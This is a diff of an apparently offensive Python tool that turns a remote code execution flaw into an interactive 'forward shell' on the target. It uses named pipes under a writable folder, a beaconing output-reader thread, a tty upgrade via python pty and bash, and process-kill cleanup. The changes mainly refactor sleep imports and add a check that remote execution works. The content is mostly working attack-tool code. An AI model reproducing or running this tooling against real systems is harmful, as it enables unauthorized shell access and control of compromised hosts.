@@ -9,7 +9,8 @@ What the fuck is going wrong with env/pwd/whoami cmd?
 """
 
 import requests
-import time
+from time import sleep
+from sys import exit
 from threading import Thread
 from random import randint
 from base64 import b64encode
@@ -70,16 +71,14 @@ class GetOutput(Thread):
     def run(self):
         while not self.stop:
             while self.pause:
-                time.sleep(.1)
+                sleep(.1)
 
             out = self.read_output()
             if out:
                 if self.rflbp:
                     out = '\n'.join(out.split('\n')[1:])
-                else:
-                    self.rflbp = True
                 print('%s ' % (out), end='')
-            time.sleep(BEACONING_DELAY)
+            sleep(BEACONING_DELAY)
 
 
 class NamedPipe(object):
@@ -101,7 +100,7 @@ class NamedPipe(object):
     def kill_process(self):
         cmd = "kill -9 $(ps aux | grep -E -m1 '(in|out)\\.%s'|awk -F ' ' '{print $2}')" % (self.sessid)
         execute(cmd)
-        time.sleep(UPGRADE_CMD_DELAY)
+        sleep(UPGRADE_CMD_DELAY)
         execute(cmd)
 
 
@@ -124,13 +123,13 @@ class FShell(object):
         self.out.pause = True
 
         execute(self.format_cmd('"python -c \'import pty;pty.spawn(\\"/bin/bash\\")\'"'))
-        time.sleep(UPGRADE_CMD_DELAY*2)
+        sleep(UPGRADE_CMD_DELAY*2)
         execute(self.format_cmd('"export TERM=xterm"'))
-        time.sleep(UPGRADE_CMD_DELAY)
+        sleep(UPGRADE_CMD_DELAY)
         execute(self.format_cmd('"alias ls=\'ls --color=auto\'"'))
-        time.sleep(UPGRADE_CMD_DELAY)
+        sleep(UPGRADE_CMD_DELAY)
         execute(self.format_cmd('"alias ll=\'ls -lah\' "'))
-        time.sleep(UPGRADE_CMD_DELAY)
+        sleep(UPGRADE_CMD_DELAY)
 
         self.out.pause = False
         self.upgraded = True
@@ -168,7 +167,7 @@ class FShell(object):
                 raw_cmd = '"%s"' % (raw_cmd)
 
             execute(self.format_cmd(raw_cmd))  # , True) # Debug mode
-            time.sleep(.2)  # restore remote PS1 before input() again
+            sleep(.2)  # restore remote PS1 before input() again
 
         print("Closing remote shell..")
         self.close_shell()
@@ -177,14 +176,13 @@ class FShell(object):
         self.out.stop = True
         if self.upgraded:
             execute(self.format_cmd('exit ;'))
-            time.sleep(UPGRADE_CMD_DELAY)
+            sleep(UPGRADE_CMD_DELAY)
             execute(self.format_cmd('exit'))
-            time.sleep(UPGRADE_CMD_DELAY)
+            sleep(UPGRADE_CMD_DELAY)
         execute(self.format_cmd('exit ;'))
 
     def print_help(self):
-        print(
-        """
+        print("""
         get_sessid:     Print session id (/WRITABLE_FOLDER/{in,out}.{sessid} files on the remote system)
         upgrade_shell:  Upgrade to tty using python pty and bash
         exit_shell:     Send 3 exit command if shell is upgraded, 1 if not
@@ -192,6 +190,12 @@ class FShell(object):
 
     def ps1(self):
         print("$> ", end='')
+
+
+def rce_check():
+    data = "He<>&|00"
+    out = execute('echo "%s"' % data)
+    return True if out == data else False
 
 
 def advertise():
@@ -206,6 +210,11 @@ def advertise():
 
 if __name__ == '__main__':
     advertise()
+
+    if not rce_check():
+        print("Remote code executing seems not working..")
+        print("Please debug 'execute' function or remove this blokcing check!")
+        exit(-1)
 
     np = NamedPipe()
     print("Creating Named Pipe (%d)..." % (np.sessid))
@@ -229,6 +238,6 @@ if __name__ == '__main__':
 
     while out.isAlive():
         print("Waiting for 'GetOutput' thread...")
-        time.sleep(1)
+        sleep(1)
 
     print("See you soon !")
